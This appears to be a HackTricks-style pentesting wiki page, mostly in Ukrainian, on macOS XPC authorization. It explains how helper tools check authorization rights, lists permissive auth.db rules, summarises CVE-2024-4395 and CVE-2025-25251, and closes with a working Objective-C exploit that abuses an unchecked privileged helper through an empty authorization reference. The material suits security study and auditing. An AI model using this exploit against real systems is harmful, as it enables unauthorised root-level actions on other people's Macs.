# macOS XPC Авторизація

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Авторизація

Apple також пропонує інший спосіб автентифікації, якщо процес, що підключається, має **permissions to call the an exposed XPC method**.

Коли додатку потрібно **виконувати дії від імені привілейованого користувача**, замість того, щоб запускати сам додаток як привілейований користувач, він зазвичай встановлює в root HelperTool як XPC service, який можна викликати з додатку для виконання цих дій. Однак додаток, що викликає сервіс, повинен мати достатню авторизацію.

### ShouldAcceptNewConnection always YES

An example could be found in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` it tries to **connect** to the **HelperTool**. And in `HelperTool/HelperTool.m` the function **`shouldAcceptNewConnection`** **won't check** any of the requirements indicated previously. It'll always return YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Для отримання додаткової інформації про те, як правильно налаштувати цю перевірку:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Права додатку

Проте відбувається певна **авторизація, коли викликається метод з HelperTool**.

Функція **`applicationDidFinishLaunching`** з `App/AppDelegate.m` створює порожній authorization reference після запуску застосунку. Це завжди ма�е працювати.\
Потім вона намагатиметься **додати деякі права** до цього authorization reference, викликаючи `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Функція `setupAuthorizationRights` з файлу `Common/Common.m` запише в базу авторизації `/var/db/auth.db` права додатку. Зверніть увагу, що вона додаватиме лише ті права, яких ще немає в базі даних:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Функція `enumerateRightsUsingBlock` — та, що використовується для отримання дозволів додатків, які визначені в `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Це означає, що наприкінці цього процесу дозволи, оголошені всередині `commandInfo`, будуть збережені в `/var/db/auth.db`. Зверніть увагу, що там для **кожного методу**, який буде **вимагати автентифікації**, можна знайти **permission name** та **`kCommandKeyAuthRightDefault`**. Останній **вказує, хто може отримати це право**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Назва</th><th width="165">Значення</th><th>Опис</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Будь-хто</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ніхто</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Поточний користувач повинен бути адміністратором (в складі групи admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Попросити користувача автентифікуватися.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Попросити користувача автентифікуватися. Користувач має бути адміністратором (в складі групи admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Задати правила</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Вказати додаткові коментарі щодо права</td></tr></tbody></table>

### Перевірка прав

У `HelperTool/HelperTool.m` функція **`readLicenseKeyAuthorization`** перевіряє, чи викликач має авторизацію для **виконання такого методу**, викликаючи функцію **`checkAuthorization`**. Ця функція перевіряє, що **authData** надіслані викликаючим процесом мають **коректний формат**, а потім перевіряє **що потрібно, щоб отримати право** викликати конкретний метод. Якщо все гаразд, **повернений `error` буде `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Note that to **check the requirements to get the right** to call that method the function `authorizationRightForCommand` will just check the previously comment object **`commandInfo`**. Then, it will call **`AuthorizationCopyRights`** to check **if it has the rights** to call the function (note that the flags allow interaction with the user).

In this case, to call the function `readLicenseKeyAuthorization` the `kCommandKeyAuthRightDefault` is defined to `@kAuthorizationRuleClassAllow`. So **anyone can call it**.

### DB Information

It was mentioned that this information is stored in `/var/db/auth.db`. You can list all the stored rules with:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Тоді можна прочитати, хто має доступ до цього права за допомогою:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Ви можете знайти **всі конфігурації дозволів** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), але комбінації, що не вимагатимуть взаємодії з користувачем, будуть:

1. **'authenticate-user': 'false'**
- Це найпряміший ключ. Якщо встановлено в `false`, це означає, що користувачу не потрібно надавати автентифікацію, щоб отримати це право.
- Використовується в **комбінації з одним із двох нижче або вказанням групи**, до якої повинен належати користувач.
2. **'allow-root': 'true'**
- Якщо користувач працює як root user (який має підвищені привілеї), і цей ключ встановлено в `true`, root user потенційно може отримати це право без додаткової автентифікації. Однак зазвичай досягнення статусу root user вже вимагає автентифікації, тому для більшості користувачів це не є сценарієм «без автентифікації».
3. **'session-owner': 'true'**
- Якщо встановлено в `true`, власник сесії (поточний увійшовший користувач) автоматично отримає це право. Це може обійти додаткову автентифікацію, якщо користувач уже увійшов в систему.
4. **'shared': 'true'**
- Цей ключ не надає прав без автентифікації. Натомість, якщо встановлено в `true`, це означає, що після того, як право було автентифіковано, воно може бути розподілене між кількома процесами без необхідності повторної автентифікації кожного з них. Але початкове надання права все одно вимагатиме автентифікації, якщо не поєднати з іншими ключами, як-от `'authenticate-user': 'false'`.

Ви можете [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Випадки обходу авторизації

- **CVE-2024-4395 – Jamf Compliance Editor helper**: Запуск аудиту створював `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, відкривав Mach service `com.jamf.complianceeditor.helper`, і експортував `-executeScriptAt:arguments:then:` без перевірки `AuthorizationExternalForm` викликувача або підпису коду. Примітивний експлойт викликає `AuthorizationCreate` для створення порожнього посилання, підключається за допомогою `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` і викликає метод для виконання довільних бінарників від імені root. Повні нотатки з реверсу (і PoC) у [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 приймав сформовані XPC-повідомлення, які доходили до привілейованого helper без механізмів авторизації. Оскільки helper довіряв власному привілейованому `AuthorizationRef`, будь-який локальний користувач, здатний надіслати повідомлення сервісу, міг змусити його виконати довільні зміни конфігурації або команди від імені root. Деталі в [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Поради для швидкої оцінки

- Коли додаток постачає як GUI, так і helper, порівняйте їхні вимоги до підпису коду і перевірте, чи `shouldAcceptNewConnection` блокує listener за допомогою `-setCodeSigningRequirement:` (або чи валідуює `SecCodeCopySigningInformation`). Відсутні перевірки зазвичай призводять до сценаріїв CWE-863, як у випадку Jamf. Швидкий огляд виглядає так:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Порівняйте те, що helper *вважає*, що він авторизує, з тим, що надає клієнт. При реверсі зупиніться на `AuthorizationCopyRights` і підтвердіть, що `AuthorizationRef` походить від `AuthorizationCreateFromExternalForm` (надана клієнтом), а не від власного привілейованого контексту helper’а — інакше ймовірно ви знайшли патерн CWE-863, аналогічний наведеним вище.

## Реверсинг Authorization

### Перевірка використання EvenBetterAuthorization

Якщо ви знайшли функцію: **`[HelperTool checkAuthorization:command:]`**, ймовірно процес використовує раніше згадану схему для авторизації:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Якщо ця функція викликає такі функції, як `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, вона використовує [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Перевірте **`/var/db/auth.db`**, щоб дізнатися, чи можливо отримати дозволи на виклик певної привілейованої дії без взаємодії з користувачем.

### Протоколна комунікація

Далі потрібно знайти схему протоколу, щоб встановити зв'язок із XPC службой.

Функція **`shouldAcceptNewConnection`** вказує на експортований протокол:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

У цьому випадку ми маємо те саме, що й у EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Знаючи назву використовуваного протоколу, можна **dump its header definition** за допомогою:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Нарешті, нам потрібно лише знати **ім'я відкритого Mach Service**, щоб встановити з ним зв'язок. Існує кілька способів знайти його:

- У **`[HelperTool init]`**, де видно, який Mach Service використовується:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- У launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Приклад Exploit

У цьому прикладі створено:

- Визначення протоколу з функціями
- Порожній auth для запиту доступу
- Підключення до XPC service
- Виклик функції, якщо підключення було успішним
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Інші XPC-помічники привілеїв, якими зловживали

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Джерела

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
